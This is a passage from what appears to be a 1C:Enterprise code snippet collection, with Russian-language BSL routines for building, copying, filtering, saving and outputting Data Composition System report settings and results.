	//		КонецЕсли;			
	//	КонецЦикла;
	//КонецЕсли; 	
	// Компоновка макета компоновки данных.
	КомпоновщикМакета 		= Новый КомпоновщикМакетаКомпоновкиДанных;
	МакетКомпоновкиДанных 	= КомпоновщикМакета.Выполнить(СхемаКомпоновкиДанных, Компоновщик.Настройки,,,Тип(""ГенераторМакетаКомпоновкиДанныхДляКоллекцииЗначений""));
	
	////////////////////////////////////////////////////////////////////////////////
	// ПОДГОТОВКА ВСПОМОГАТЕЛЬНЫХ ДАННЫХ ДЛЯ СОПОСТАВЛЕНИЯ ПОЛЕЙ ШАБЛОНА И СКД
	
	//Для каждого Поле Из МакетКомпоновкиДанных.НаборыДанных.НаборДанных1.Поля Цикл
	//	СтруктураРезультата.СоответствиеПолейСКДКолонкамТаблицыТоваров.Вставить(ПолучитьИмяПоляВШаблоне(Поле.ПутьКДанным), Поле.Имя);
	//КонецЦикла;
	
	////////////////////////////////////////////////////////////////////////////////
	// ВЫПОЛНЕНИЕ ЗАПРОСА
	
	СтруктураРезультата.ЗапросНабора1 = Новый Запрос(МакетКомпоновкиДанных.НаборыДанных.НаборДанных1.Запрос);
	//СтруктураРезультата.ЗапросНабора2 = Новый Запрос(МакетКомпоновкиДанных.НаборыДанных.НаборДанных2.Запрос);
	
	// Заполнение параметров с полей отбора компоновщика настроек формы обработки.
	Для каждого Параметр Из МакетКомпоновкиДанных.ЗначенияПараметров Цикл
		СтруктураРезультата.ЗапросНабора1.Параметры.Вставить(Параметр.Имя, Параметр.Значение);
		//СтруктураРезультата.ЗапросНабора2.Параметры.Вставить(Параметр.Имя, Параметр.Значение);
	КонецЦикла;
	
	Возврат СтруктураРезультата;
	
КонецФункции // ПодготовитьСтруктуруДанных()

&НаСервере
Процедура ЗаполнитьЭлементы(ПриемникЗначения, ИсточникЗначения, ПервыйУровень = Неопределено)
	
	Если ТипЗнч(ПриемникЗначения) = Тип(""КоллекцияЗначенийПараметровКомпоновкиДанных"") Тогда
		КоллекцияЗначений = ИсточникЗначения;
	Иначе
		КоллекцияЗначений = ИсточникЗначения.Элементы;
	КонецЕсли;
	
	Для каждого ЭлементИсточник Из КоллекцияЗначений Цикл
		Если ПервыйУровень = Неопределено Тогда
			ЭлементПриемник = ПриемникЗначения.НайтиЗначениеПараметра(ЭлементИсточник.Параметр);
		Иначе
			ЭлементПриемник = ПервыйУровень.НайтиЗначениеПараметра(ЭлементИсточник.Параметр);
		КонецЕсли;
		Если ЭлементПриемник = Неопределено Тогда
			Продолжить;
		КонецЕсли;
		ЗаполнитьЗначенияСвойств(ЭлементПриемник, ЭлементИсточник);
		Если ТипЗнч(ЭлементИсточник) = Тип(""ЗначениеПараметраКомпоновкиДанных"") Тогда
			Если ЭлементИсточник.ЗначенияВложенныхПараметров.Количество() <> 0 Тогда
				ЗаполнитьЭлементы(ЭлементПриемник.ЗначенияВложенныхПараметров, ЭлементИсточник.ЗначенияВложенныхПараметров, ПриемникЗначения);
			КонецЕсли;
		КонецЕсли;
	КонецЦикла;
	
КонецПроцедуры

&НаСервере
// Копирует элементы из одной коллекции в другую
Процедура СкопироватьЭлементы(ПриемникЗначения, ИсточникЗначения, ПроверятьДоступность = Ложь, ОчищатьПриемник = Истина) 
	
	Если ТипЗнч(ИсточникЗначения) = Тип(""УсловноеОформлениеКомпоновкиДанных"")
		ИЛИ ТипЗнч(ИсточникЗначения) = Тип(""ВариантыПользовательскогоПоляВыборКомпоновкиДанных"")
		ИЛИ ТипЗнч(ИсточникЗначения) = Тип(""ОформляемыеПоляКомпоновкиДанных"")
		ИЛИ ТипЗнч(ИсточникЗначения) = Тип(""ЗначенияПараметровДанныхКомпоновкиДанных"") Тогда
		СоздаватьПоТипу = Ложь;
	Иначе
		СоздаватьПоТипу = Истина;
	КонецЕсли;
	ПриемникЭлементов = ПриемникЗначения.Элементы;
	ИсточникЭлементов = ИсточникЗначения.Элементы;
	Если ОчищатьПриемник Тогда
		ПриемникЭлементов.Очистить();
	КонецЕсли;
	
	Для каждого ЭлементИсточник Из ИсточникЭлементов Цикл
		
		Если ТипЗнч(ЭлементИсточник) = Тип(""ЭлементПорядкаКомпоновкиДанных"") Тогда
			// Элементы порядка добавляем в начало
			Индекс = ИсточникЭлементов.Индекс(ЭлементИсточник);
			ЭлементПриемник = ПриемникЭлементов.Вставить(Индекс, ТипЗнч(ЭлементИсточник));
		Иначе
			Если СоздаватьПоТипу Тогда
				ЭлементПриемник = ПриемникЭлементов.Добавить(ТипЗнч(ЭлементИсточник));
			Иначе
				ЭлементПриемник = ПриемникЭлементов.Добавить();
			КонецЕсли;
		КонецЕсли;
		
		ЗаполнитьЗначенияСвойств(ЭлементПриемник, ЭлементИсточник);
		// В некоторых коллекциях необходимо заполнить другие коллекции
		Если ТипЗнч(ИсточникЭлементов) = Тип(""КоллекцияЭлементовУсловногоОформленияКомпоновкиДанных"") Тогда
			СкопироватьЭлементы(ЭлементПриемник.Поля, ЭлементИсточник.Поля);
			СкопироватьЭлементы(ЭлементПриемник.Отбор, ЭлементИсточник.Отбор);
			ЗаполнитьЭлементы(ЭлементПриемник.Оформление, ЭлементИсточник.Оформление); 
		ИначеЕсли ТипЗнч(ИсточникЭлементов)	= Тип(""КоллекцияВариантовПользовательскогоПоляВыборКомпоновкиДанных"") Тогда
			СкопироватьЭлементы(ЭлементПриемник.Отбор, ЭлементИсточник.Отбор);
		КонецЕсли;
		
		// В некоторых элементах коллекции необходимо заполнить другие коллекции
		Если ТипЗнч(ЭлементИсточник) = Тип(""ГруппаЭлементовОтбораКомпоновкиДанных"") Тогда
			СкопироватьЭлементы(ЭлементПриемник, ЭлементИсточник);
		ИначеЕсли ТипЗнч(ЭлементИсточник) = Тип(""ГруппаВыбранныхПолейКомпоновкиДанных"") Тогда
			СкопироватьЭлементы(ЭлементПриемник, ЭлементИсточник);
		ИначеЕсли ТипЗнч(ЭлементИсточник) = Тип(""ПользовательскоеПолеВыборКомпоновкиДанных"") Тогда
			СкопироватьЭлементы(ЭлементПриемник.Варианты, ЭлементИсточник.Варианты);
		ИначеЕсли ТипЗнч(ЭлементИсточник) = Тип(""ПользовательскоеПолеВыражениеКомпоновкиДанных"") Тогда
			ЭлементПриемник.УстановитьВыражениеДетальныхЗаписей (ЭлементИсточник.ПолучитьВыражениеДетальныхЗаписей());
			ЭлементПриемник.УстановитьВыражениеИтоговыхЗаписей(ЭлементИсточник.ПолучитьВыражениеИтоговыхЗаписей());
			ЭлементПриемник.УстановитьПредставлениеВыраженияДетальныхЗаписей(ЭлементИсточник.ПолучитьПредставлениеВыраженияДетальныхЗаписей ());
			ЭлементПриемник.УстановитьПредставлениеВыраженияИтоговыхЗаписей(ЭлементИсточник.ПолучитьПредставлениеВыраженияИтоговыхЗаписей ());
		КонецЕсли;
		
	КонецЦикла;
	
КонецПроцедуры

&НаСервере
// Найти поле СКД по полному имени.
//
Функция НайтиПолеСКДПоПолномуИмени(Элементы, ПолноеИмя) Экспорт

	масЧастейИмен = ИзПолногоИмениПоляПолучитьЧасти(ПолноеИмя);
	колЧастей = масЧастейИмен.Количество();
	
	текИмя = масЧастейИмен[0];
	Поле = НайтиПолеСКДПоИмени(Элементы, текИмя);
	Если Поле = Неопределено Тогда
		Возврат Неопределено;
	КонецЕсли;
	
	Для Сч = 2 По колЧастей Цикл
		текИмя = текИмя +""."" + масЧастейИмен[Сч-1];
		Поле = НайтиПолеСКДПоИмени(Поле.Элементы, текИмя);
		Если Поле = Неопределено Тогда
			Возврат Неопределено;
		КонецЕсли;
	КонецЦикла;
	
	Возврат Поле;

КонецФункции // НайтиПолеСКДПоПолномуИмени()

&НаСервере
// Функция выполняет получение имени поля из доступных полей компоновки данных.
//
Функция ПолучитьИмяПоляВШаблоне(Знач ИмяПоля) Экспорт
	
	ИмяПоля = СтрЗаменить(ИмяПоля, "".DeletionMark"", "".ПометкаУдаления"");
	ИмяПоля = СтрЗаменить(ИмяПоля, "".Owner"", "".Владелец"");
	ИмяПоля = СтрЗаменить(ИмяПоля, "".Code"", "".Код"");
	ИмяПоля = СтрЗаменить(ИмяПоля, "".Parent"", "".Родитель"");
	ИмяПоля = СтрЗаменить(ИмяПоля, "".Predefined"", "".Предопределенный"");
	ИмяПоля = СтрЗаменить(ИмяПоля, "".IsFolder"", "".ЭтоГруппа"");
	ИмяПоля = СтрЗаменить(ИмяПоля, "".Description"", "".Наименование"");
	Возврат ИмяПоля;
	
КонецФункции // ПолучитьИмяПоляВШаблоне()

&НаСервере
// Полное имя поля разделить по частям
//
Функция ИзПолногоИмениПоляПолучитьЧасти(ПолноеИмя)

	масЧастей = Новый Массив;
	СтрИмя = ПолноеИмя;
	
	Пока Не ПустаяСтрока(СтрИмя) Цикл
		Если Лев(СтрИмя, 1) = ""["" Тогда
			
			Поз = Найти(СтрИмя, ""]"");
			Если Поз = 0 Тогда
				масЧастей.Добавить(Сред(СтрИмя, 2));
				СтрИмя = """";
			Иначе
				масЧастей.Добавить(Сред(СтрИмя, 1, Поз));
				СтрИмя = Сред(СтрИмя, Поз + 2);
			КонецЕсли;
			
		Иначе
			
			Поз = Найти(СтрИмя, ""."");
			Если Поз = 0 Тогда
				масЧастей.Добавить(СтрИмя);
				СтрИмя = """";
			Иначе
				масЧастей.Добавить(Лев(СтрИмя, Поз - 1));
				СтрИмя = Сред(СтрИмя, Поз + 1);
			КонецЕсли;
		КонецЕсли;
	КонецЦикла;
	
	Возврат масЧастей;

КонецФункции // ИзПолногоИмениПоляПолучитьЧасти()

&НаСервере
// Среди элементов полей СКД найти поле по имени.
//
Функция НайтиПолеСКДПоИмени(Элементы, Имя)
	
	Для Каждого Элемент Из Элементы Цикл
		Если ВРЕГ(Строка(Элемент.Поле)) = ВРЕГ(Имя) Тогда
			Возврат Элемент;
		КонецЕсли;
	КонецЦикла;
	
	Возврат Неопределено;
	
КонецФункции // НайтиПолеСКДПоИмени()

//---====== Отбор СКД ================================================ 
"}
},
{0,
{"Сохранение и Загрузка настроек СКД",0,0,"","//+++ ====== Сохранение и Загрузка настроек СКД ================================================

&НаКлиенте
Процедура СохранитьНастройкиКомпановкиДанных()
	
	СохранитьНастройкиКомпановкиДанныхНаСервере();
	
КонецПроцедуры 

&НаСервере
Процедура СохранитьНастройкиКомпановкиДанныхНаСервере()
	
	НастройкиКомпоновщикаХранилище = Новый ХранилищеЗначения(КомпоновщикНастроекКомпоновкиДанных.Настройки);
	
	КлючНастроек 	= ПолучитьКлючНастроек();
	ДопПараметры 	= Новый Структура();
	ДопПараметры.Вставить(""НастройкиКомпоновщикаХранилище""	, НастройкиКомпоновщикаХранилище);
	ДопПараметры.Вставить(""ЗагружатьСохраненныеНастройки""	, ЗагружатьСохраненныеНастройки);
	ДопПараметры.Вставить(""СохранитьНастройкиПриЗакрытии""	, СохранитьНастройкиПриЗакрытии);
	
	ХранилищеОбщихНастроек.Сохранить(КлючНастроек, КлючНастроек, ДопПараметры);
	
КонецПроцедуры

&НаКлиенте
Процедура ЗагрузитьСохраненныеНастройки(Команда)
	
	ПрименениеСКД();
	
КонецПроцедуры

&НаСервере
Процедура ЗагрузитьСохраненныеНастройкиНаСервере(пНастройкиКомпоновщика)
	
	КлючНастроек 			= ПолучитьКлючНастроек();
	СохраненныеНастройки 	= ХранилищеОбщихНастроек.Загрузить(КлючНастроек, КлючНастроек);
	
	Если СохраненныеНастройки <> Неопределено Тогда
		Если СохраненныеНастройки.Свойство(""НастройкиКомпоновщикаХранилище"") Тогда
			пНастройкиКомпоновщика = СохраненныеНастройки.НастройкиКомпоновщикаХранилище.Получить();
		Конецесли;
		Если СохраненныеНастройки.Свойство(""ЗагружатьСохраненныеНастройки"") Тогда
			ЗагружатьСохраненныеНастройки = СохраненныеНастройки.ЗагружатьСохраненныеНастройки;
		Конецесли;
		Если СохраненныеНастройки.Свойство(""СохранитьНастройкиПриЗакрытии"") Тогда
			СохранитьНастройкиПриЗакрытии = СохраненныеНастройки.СохранитьНастройкиПриЗакрытии;
		Конецесли;
	Конецесли;
	
КонецПроцедуры

//--- ====== Сохранение и Загрузка настроек СКД ================================================ 
"}
},
{0,
{"Условное оформление таблицы значений из СКД",0,0,"","//+++ ====== Условное оформление ================================================
// https://infostart.ru/public/186640/

// Процедуры для работы с условным оформлением

&НаСервере
Процедура ПерезаполнитьУФФормы()
	
	УсловноеОформление.Элементы.Очистить();
	
	УсловноеОформлениеКомпоновщика = КомпоновщикНастроекКомпоновкиДанных.Настройки.УсловноеОформление;
	
	Для каждого ЭлементУФ Из УсловноеОформлениеКомпоновщика.Элементы Цикл
		
		ЭлементУсловногоОформления = УсловноеОформление.Элементы.Добавить();
		ЭлементУсловногоОформления.Использование = ЭлементУФ.Использование;
		
		// Заполняем поля к которым будет применятся условное оформление
		СкопироватьПоляУсловногоОформления(ЭлементУсловногоОформления, ЭлементУФ);
		
		// Заполняем отбор для условного офрмления
		СкопироватьОтборУсловногоОформления(ЭлементУсловногоОформления, ЭлементУФ.Отбор);
		
		// Заполняем элементы условного офрмления
		СкопироватьЭлементОформления(ЭлементУсловногоОформления, ЭлементУФ);
		
	КонецЦикла;
	
КонецПроцедуры // ПерезаполнитьУФФормы()

&НаСервере
Процедура СкопироватьПоляУсловногоОформления(ЭлементУсловногоОформления, ЭлементКомпоновщика)
	
	ЭлементыПоля = ЭлементКомпоновщика.Поля.Элементы;
	Если ЭлементыПоля.Количество() = 0 Тогда
		ОформляемоеПоле = ЭлементУсловногоОформления.Поля.Элементы.Добавить();
		ОформляемоеПоле.Поле = Новый ПолеКомпоновкиДанных(""ТаблицаНоменклатуры"");
		ОформляемоеПоле.Использование = Истина;
	Иначе
		Для каждого ЭлементПоля Из ЭлементыПоля Цикл
			ОформляемоеПоле = ЭлементУсловногоОформления.Поля.Элементы.Добавить();
			ЗаполнитьЗначенияСвойств(ОформляемоеПоле, ЭлементПоля);
			ОформляемоеПоле.Поле = Новый ПолеКомпоновкиДанных(Строка(ЭлементПоля.Поле));
		КонецЦикла;
	КонецЕсли;
	
КонецПроцедуры // СкопироватьПоляУсловногоОформления()

&НаСервере
Процедура СкопироватьОтборУсловногоОформления(ЭлементУсловногоОформления, ЭлементКомпоновщика)
	
	Для каждого ЭлементОтбора Из ЭлементКомпоновщика.Элементы Цикл
		Если ТипЗнч(ЭлементОтбора) = Тип(""ГруппаЭлементовОтбораКомпоновкиДанных"") Тогда
			ГруппаОтбора = ЭлементУсловногоОформления.Отбор.Элементы.Добавить(Тип(""ГруппаЭлементовОтбораКомпоновкиДанных""));
			ЗаполнитьЗначенияСвойств(ГруппаОтбора, ЭлементОтбора);
			СкопироватьОтборУсловногоОформления(ЭлементУсловногоОформления, ЭлементОтбора);
		Иначе
			НовыйЭлементОтбора = ЭлементУсловногоОформления.Отбор.Элементы.Добавить(Тип(""ЭлементОтбораКомпоновкиДанных""));
			ЗаполнитьЗначенияСвойств(НовыйЭлементОтбора, ЭлементОтбора);
			НовыйЭлементОтбора.ЛевоеЗначение = Новый ПолеКомпоновкиДанных(""ТаблицаНоменклатуры."" + Строка(ЭлементОтбора.ЛевоеЗначение));
		КонецЕсли;
	КонецЦикла;
	
КонецПроцедуры // СкопироватьОтборУсловногоОформления()

&НаСервере
Процедура СкопироватьЭлементОформления(ЭлементУсловногоОформления, ЭлементКомпоновщика)
	
	ЭлементыОформления = ЭлементКомпоновщика.Оформление.Элементы;
	
	Для каждого ЭлементОформления Из ЭлементыОформления Цикл
		Если ЭлементОформления.Использование Тогда
			ЭлементУсловногоОформления.Оформление.УстановитьЗначениеПараметра(ЭлементОформления.Параметр, ЭлементОформления.Значение);
		КонецЕсли;
	КонецЦикла;
	
КонецПроцедуры // СкопироватьЭлементОформления()

//--- ====== Условное оформление ================================================ "}
}
},
{0,
{"Группа в отборе",0,0,"","//Отбор в динамическом списке дс c группой условий

ЭлементыОтбора 		= ТекущиеЗаявкиТикеты.Отбор.Элементы;
ЭлементыОтбора.Очистить();
Группа 				= ЭлементыОтбора.Добавить(Тип(""ГруппаЭлементовОтбораКомпоновкиДанных""));
Группа.ТипГруппы 	= ТипГруппыЭлементовОтбораКомпоновкиДанных.ГруппаИли;
//ДатаПостановки

ЭлементОтбора = Группа.Элементы.Добавить(Тип(""ЭлементОтбораКомпоновкиДанных"")); 
НовыйПолеКомпоновкиДанных 		= Новый ПолеКомпоновкиДанных(""ДатаПостановки"");
ЭлементОтбора.Использование  	= Истина;
ЭлементОтбора.ЛевоеЗначение  	= НовыйПолеКомпоновкиДанных; 
ЭлементОтбора.ВидСравнения   	= ВидСравненияКомпоновкиДанных.Больше;
ЭлементОтбора.ПравоеЗначение 	= (НачалоДня(ТекущаяДата())-((3600*24)*7));;
//Выполнить

ЭлементОтбора = Группа.Элементы.Добавить(Тип(""ЭлементОтбораКомпоновкиДанных"")); 
НовыйПолеКомпоновкиДанных 		= Новый ПолеКомпоновкиДанных(""Выполнена"");
ЭлементОтбора.Использование  	= Истина;
ЭлементОтбора.ЛевоеЗначение  	= НовыйПолеКомпоновкиДанных; 
ЭлементОтбора.ВидСравнения   	= ВидСравненияКомпоновкиДанных.Равно;
ЭлементОтбора.ПравоеЗначение 	= Ложь;
//ОтказОтЗадачи

ЭлементОтбора = Группа.Элементы.Добавить(Тип(""ЭлементОтбораКомпоновкиДанных"")); 
НовыйПолеКомпоновкиДанных 		= Новый ПолеКомпоновкиДанных(""ОтказОтЗадачи"");
ЭлементОтбора.Использование  	= Ложь;
ЭлементОтбора.ЛевоеЗначение  	= НовыйПолеКомпоновкиДанных; 
ЭлементОтбора.ВидСравнения   	= ВидСравненияКомпоновкиДанных.Равно;
ЭлементОтбора.ПравоеЗначение 	= Ложь;"}
},
{0,
{"Программный вывод результат отчета СКД в таблицу значений",0,0,"","// Программный вывод результат отчета СКД в таблицу значений
// https://erpdev.ru/blog/471
//Для программного вывода результата отчета СКД в таблицу значений, необходимо в модуле объекта объявить обработчик событий «ПриКомпоновкеРезультата» и прописать код, который указан в примере:     

Процедура ПриКомпоновкеРезультата(ДокументРезультат, ДанныеРасшифровки, СтандартнаяОбработка)
        
    КомпоновщикМакета = Новый КомпоновщикМакетаКомпоновкиДанных();    
    МакетКомпоновкиДанных = КомпоновщикМакета.Выполнить(СхемаКомпоновкиДанных, КомпоновщикНастроек.ПолучитьНастройки(),,,Тип(""ГенераторМакетаКомпоновкиДанныхДляКоллекцииЗначений""));
    
    // Инициализация процессора компоновки
    ПроцессорКомпоновкиДанных = Новый ПроцессорКомпоновкиДанных;
    ПроцессорКомпоновкиДанных.Инициализировать(МакетКомпоновкиДанных,,,);
    
    Таблица = Новый ТаблицаЗначений;
    
    // Получение результата
    ПроцессорВыводаРезультатаКомпоновкиДанных = Новый ПроцессорВыводаРезультатаКомпоновкиДанныхВКоллекциюЗначений;
    ПроцессорВыводаРезультатаКомпоновкиДанных.УстановитьОбъект(Таблица);
    ПроцессорВыводаРезультатаКомпоновкиДанных.Вывести(ПроцессорКомпоновкиДанных);
    
КонецПроцедуры"}
},
{0,
{"Запросы из макета СКД",0,0,"","Процедура СообщитьЗапросы(МакетКомпоновки, Уровень)
	Для каждого Набор из МакетКомпоновки.НаборыДанных Цикл
		Сообщить(""Уровень ""+Уровень+"": ""+Набор.Имя);
		Сообщить(Набор.Запрос);
		Для каждого ЭлементТела из МакетКомпоновки.Тело Цикл
			Если ТипЗнч(ЭлементТела)=Тип(""ГруппировкаМакетаКомпоновкиДанных"") Тогда
				Для каждого ЭлементТелаГруппировки из ЭлементТела.Тело Цикл
					Если ТипЗнч(ЭлементТелаГруппировки)=Тип(""ВложенныйОбъектМакетаКомпоновкиДанных"") Тогда
						СообщитьЗапросы(ЭлементТелаГруппировки.КомпоновкаДанных, Уровень+1)
					КонецЕсли;
				КонецЦикла;
			КонецЕсли;
		КонецЦикла;
	КонецЦикла;
КонецПроцедуры"}
},
{0,
{"СКД отчет_Уровень группировки при открытии отчета",0,0,"","Процедура ПриКомпоновкеРезультата(ДокументРезультат, ДанныеРасшифровки, СтандартнаяОбработка) Экспорт
	// СКД Уровень группировки при открытии отчета
	СтандартнаяОбработка = Ложь;
	КомпоновщикМакет = Новый КомпоновщикМакетаКомпоновкиДанных;
	Макет = КомпоновщикМакет.Выполнить(СхемаКомпоновкиДанных, КомпоновщикНастроек.ПолучитьНастройки(), ДанныеРасшифровки);
	ПроцессорКомпоновки = Новый ПроцессорКомпоновкиДанных;
	ПроцессорКомпоновки.Инициализировать(Макет, , ДанныеРасшифровки);
	ПроцессорВывода = Новый ПроцессорВыводаРезультатаКомпоновкиДанныхВТабличныйДокумент;
	ПроцессорВывода.УстановитьДокумент(ДокументРезультат);
	ПроцессорВывода.Вывести(ПроцессорКомпоновки);
	
	//ДокументРезультат.ПоказатьУровеньГруппировокСтрок(2); //Уровень 3
	//ДокументРезультат.ПоказатьУровеньГруппировокСтрок(1); //Уровень 2
	//ДокументРезультат.ПоказатьУровеньГруппировокСтрок(0); //Уровень 1
КонецПроцедуры"}
},
{0,
{"СКД программно",0,0,"","Функция АйТи_ФормированиеДанныхКонтрагентов(пОбщиеНастройки, ТипДанных) Экспорт
	
	ОбщиеНастройки = Новый Структура;
	Для Каждого ЭлементСтруктуры Из пОбщиеНастройки Цикл
	  ОбщиеНастройки.Вставить(ЭлементСтруктуры.Ключ, ЭлементСтруктуры.Значение);
	КонецЦикла;	
	
	Б24_ОбменСПорталомВызовСервера.ДобавитьСложныеНастройкиОбменаВСтруктуру(ОбщиеНастройки);
	
	Если ТипДанных = ОбщиеНастройки.ТипыОбъектовОбмена.Компания тогда
		
		СКД 	= Новый СхемаКомпоновкиДанных;
		ИД 		= СКД.ИсточникиДанных.Добавить();
		ИД.Имя 	= ""ИсточникДанных"";
		ИД.ТипИсточникаДанных 	= ""local"";
		НаборДанных 			= СКД.НаборыДанных.Добавить(Тип(""НаборДанныхЗапросСхемыКомпоновкиДанных""));
		НаборДанных.Имя 		= ""НаборДанный1"";
		НаборДанных.Запрос 		= ""ВЫБРАТЬ
		|	Контрагенты.Ссылка КАК Объект
		|ИЗ
		|	Справочник.Контрагенты КАК Контрагенты"";
		
		НаборДанных.ИсточникДанных 	= ""ИсточникДанных"";
		СхемаКомпоновкиДанных 		= СКД;
		
		//Настройки 	= Новый НастройкиКомпоновкиДанных; //КомпоновщикНастроек.Настройки; //КомпоновщикНастроек.Настройки - если с формы
		Настройки 	= ОбщиеНастройки.НастройиСинхронизацииКонтрагентов.НастройкиКомпоновкиДанныхКонтрагентов;
		
		//Настройки.Отбор = НастройкиМодуля.Отбор; //Так не присвоится, заругается
		
		//Помещаем в переменную данные о расшифровке данных 
		ДанныеРасшифровки = Новый ДанныеРасшифровкиКомпоновкиДанных;
		
		//Формируем макет, с помощью компоновщика макета 
		КомпоновщикМакета = Новый КомпоновщикМакетаКомпоновкиДанных;
		
		//Передаем в макет компоновки схему, настройки и данные расшифровки 
		МакетКомпоновки = КомпоновщикМакета.Выполнить(СхемаКомпоновкиДанных, Настройки, ДанныеРасшифровки);
		
		//Выполним компоновку с помощью процессора компоновки 
		ПроцессорКомпоновкиДанных = Новый ПроцессорКомпоновкиДанных;
		ПроцессорКомпоновкиДанных.Инициализировать(МакетКомпоновки,, ДанныеРасшифровки);
		
		//Очищаем поле табличного документа 
		//Результат = ЭлементыФормы.Результат;
		//Результат.Очистить();
		
		Запрос = Новый Запрос;
		
		КомпоновщикМакета = Новый КомпоновщикМакетаКомпоновкиДанных();
		
		//МакетКомпоновкиДанных = КомпоновщикМакета.Выполнить(СхемаВыгрузки, КомпоновщикНастроек.ПолучитьНастройки(),,,);
		
		Запрос.Текст = МакетКомпоновки.НаборыДанных[НаборДанных.Имя].Запрос;
		
		Для каждого Параметр Из МакетКомпоновки.ЗначенияПараметров Цикл
			Запрос.Параметры.Вставить(Параметр.Имя, Параметр.Значение);
		КонецЦикла;
		
		//Выводим результат в табличный документ 
		//ПроцессорВывода = Новый ПроцессорВыводаРезультатаКомпоновкиДанныхВТабличныйДокумент;
		//ПроцессорВывода.УстановитьДокумент(Результат);
		//
		//ПроцессорВывода.Вывести(ПроцессорКомпоновкиДанных);
		//
		//ЭлементыФормы.Результат.ПоказатьУровеньГруппировокСтрок(0);
		////*
		//Запрос = ПолучитьЗапросДляВыгрузкиДанных(ОбщиеНастройки, ТипДанных, ОбщиеНастройки.СтруктураСхемКомпоновки.Компании, ОбщиеНастройки.НастройиСинхронизацииКонтрагентов.НастройкиКомпоновкиДанныхКонтрагентов);
		
		ТаблицаОбъектовОбменаВыгрузки = запрос.Выполнить().Выгрузить();
		
		Возврат ТаблицаОбъектовОбменаВыгрузки;
		
	КонецЕсли;
	
КонецФункции
"}
},
{0,
{"СКД программано (с сайта)",0,0,"","СхемаКомпоновки = Новый СхемаКомпоновкиДанных;
//   
//    ИсточникДанных = СхемаКомпоновки.ИсточникиДанных.Добавить();
//    ИсточникДанных.Имя = ""МойИсточникДанных"";
//    ИсточникДанных.ТипИсточникаДанных = ""Local"";
//   
//    НаборДанных = СхемаКомпоновки.НаборыДанных.Добавить(Тип(""НаборДанныхЗапросСхемыКомпоновкиДанных""));
//    НаборДанных.Имя = ""МойНаборДанных"";
//    НаборДанных.ИсточникДанных = ИсточникДанных.Имя;
//    НаборДанных.Запрос = ""ВЫБРАТЬ
//                         |    ПродажиОбороты.Номенклатура,
//                         |    ПродажиОбороты.Контрагент,
//                         |    ПродажиОбороты.СуммаОборот
//                         |ИЗ
//                         |    РегистрНакопления.Продажи.Обороты КАК ПродажиОбороты"";
//   
//    ДоступноеПоле = НаборДанных.Поля.Добавить(Тип(""ПолеНабораДанныхСхемыКомпоновкиДанных""));
//    ДоступноеПоле.Поле = ""Номенклатура"";
//    ДоступноеПоле.ПутьКДанным = ""Номенклатура"";
//    ДоступноеПоле.Роль.Измерение = Истина;"}
},
{0,
{"СКД программно 3",0,0,"","//Получаем схему из макета
СхемаКомпоновкиДанных = ПолучитьМакет(""ОтчетПоСборнымЗаказам"");

//создадим компоновщик настроек и загрузим настройки по умолчанию, вместо настроек по умолчанию можно использовать восстановленные настройки
КомпоновщикНастроек = Новый КомпоновщикНастроекКомпоновкиДанных();
КомпоновщикНастроек.Инициализировать(Новый ИсточникДоступныхНастроекКомпоновкиДанных(СхемаКомпоновкиДанных));
КомпоновщикНастроек.ЗагрузитьНастройки(СхемаКомпоновкиДанных.НастройкиПоУмолчанию);
Настройки = КомпоновщикНастроек.Настройки;

//установка параметров отчета, без КомпоновщикНастроекКомпоновкиДанных делать это гораздо сложнее
Настройки.ПараметрыДанных.УстановитьЗначениеПараметра(""СвойствоВодитель"",         мСвойствоВодитель);
Настройки.ПараметрыВывода.УстановитьЗначениеПараметра(""Заголовок"",            Заголовок);

//Помещаем в переменную данные о расшифровке данных - здесь ненужный пункт, но пусть будет.
ДанныеРасшифровки = Новый ДанныеРасшифровкиКомпоновкиДанных;

//Формируем макет, с помощью компоновщика макета
КомпоновщикМакета = Новый КомпоновщикМакетаКомпоновкиДанных;

//Передаем в макет компоновки схему, настройки и данные расшифровки
МакетКомпоновки = КомпоновщикМакета.Выполнить(СхемаКомпоновкиДанных, Настройки, ДанныеРасшифровки);

//Выполним компоновку с помощью процессора компоновки
ПроцессорКомпоновкиДанных = Новый ПроцессорКомпоновкиДанных;
ПроцессорКомпоновкиДанных.Инициализировать(МакетКомпоновки, , ДанныеРасшифровки);

//Очищаем поле табличного документа
Результат = Новый ТабличныйДокумент();
//Выводим результат в табличный документ
ПроцессорВывода = Новый ПроцессорВыводаРезультатаКомпоновкиДанныхВТабличныйДокумент;
ПроцессорВывода.УстановитьДокумент(Результат);

ПроцессорВывода.Вывести(ПроцессорКомпоновкиДанных);

Результат.ОтображатьЗаголовки = Ложь;
Результат.ОтображатьСетку = Ложь;
Результат.Показать();


//А вот бонусом программное восстановление значений полей из настроек для управляемой формы
	
&НаСервере
Процедура ПриСозданииНаСервере(Отказ, СтандартнаяОбработка)
	Отбор = Новый Структура();
	Отбор.Вставить(""КлючОбъекта"", ИмяФормы);
	Отбор.Вставить(""КлючНастройки"", ""Основная""); //тут имя настройки
	Отбор.Вставить(""Пользователь"", глЗначениеПеременной(""глТекущийПользователь"").Код);
	Настройки = ХранилищеНастроекДанныхФорм.Выбрать(Отбор);
	Если Настройки.Следующий() Тогда
		Для Каждого стр из Настройки.Настройки Цикл
			Выполнить(стр.Ключ + "" = стр.Значение"");
		КонецЦикла;
	КонецЕсли;
КонецПроцедуры"}
},
{0,
{"ПолучитьРезультатКомпоновки (выполнить запрос СКД и вернуть результат)",0,0,"","Функция ПолучитьРезультатКомпоновки(МакетКомпоновки, Результат = Неопределено, Режим = Ложь,Настройки = Неопределено, ВнешниеДанные = Неопределено, МакетОформления = Неопределено, ПоказыватьВывод = Ложь) Экспорт
    
    КомпоновщикМакета 	= Новый КомпоновщикМакетаКомпоновкиДанных;
    ДанныеРасшифровки 	= Новый ДанныеРасшифровкиКомпоновкиДанных;
    
     МакетКомпоновкиДанных 	= КомпоновщикМакета.Выполнить(МакетКомпоновки
    , ?(Настройки = Неопределено, МакетКомпоновки.НастройкиПоУмолчанию, Настройки)
	, ДанныеРасшифровки, МакетОформления, ?(Режим, Неопределено, Тип(""ГенераторМакетаКомпоновкиДанныхДляКоллекцииЗначений"")));
    
	Если ВнешниеДанные = Неопределено Тогда
		ВнешниеДанные 	= Новый Структура;
		ВнешниеДанные.Вставить(""Неопределено"", Неопределено);
	КонецЕсли; 
    
    ПроцессорКомпоновкиДанных 	= Новый ПроцессорКомпоновкиДанных;
    ПроцессорКомпоновкиДанных.Инициализировать(МакетКомпоновкиДанных,ВнешниеДанные);
    
